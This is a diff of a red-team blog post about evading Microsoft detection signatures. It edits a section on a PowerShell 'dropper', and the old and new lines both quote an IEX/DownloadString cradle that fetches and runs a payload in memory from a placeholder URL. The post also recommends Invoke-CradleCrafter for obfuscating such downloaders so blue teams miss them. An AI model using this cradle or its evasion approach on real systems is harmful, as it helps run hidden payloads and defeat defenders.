@@ -109,11 +109,14 @@ Most security related solutions created features for detecting base64 encoded st
 <br/>Now that I identified almost all the patterns that are triggering the Microsoft's signatures, let's speak about the dropper before starting with the demo.
 
 <b> Dropper </b><br/>
-Maybe many of you are just using the powershell command "IEX((New-Object System.Net.WebClient).downloadstring('http://something'));" for downloading in memory your payload. I worked in a SOC and I know the strings "new-object","Webclient","downloadstring" are used by many for detecting malicious events so I do not want be catched by any blue team. This being said, I do not want to be catched by some basic rules for detecting suspicious powershell so I will make use of a open source tool made special for this kind of tasks.<br/>
-Like as Invoke-Obfuscation, Daniel Bohannon created a <a href="https://github.com/danielbohannon/Invoke-CradleCrafter" style="text-decoration: none;">tool</a> like as Invoke-Obfuscation, for obfuscated in memory or on disk downloader. 
+Possibly many of you use the powershell command "IEX((New-Object System.Net.WebClient).downloadstring('http://something'));" for downloading in memory your payload. I worked in a SOC and I know the strings like "new-object", "Webclient", "downloadstring" are used by many for detecting suspicious events. I will make use of an open source <a href="https://github.com/danielbohannon/Invoke-CradleCrafter" style="text-decoration: none;">tool</a> made special for this kind of tasks.<br/>
+Invoke-CradleCafter is a tool special created for automating the process for making obfuscated downloaders in memory or on disk. 
 
 I invite you to take a look on it in case you are interested in using the downloader on disk. I am using the only in memory downloader.
-
+<div>
+<center><img src="/images/2020-04-16-RedTeam-Exercises-with-OpenSource-Tools-Part-2.md/cradle.png">
+ </center>
+</div>
 <b> Demo </b><br/>
 
 
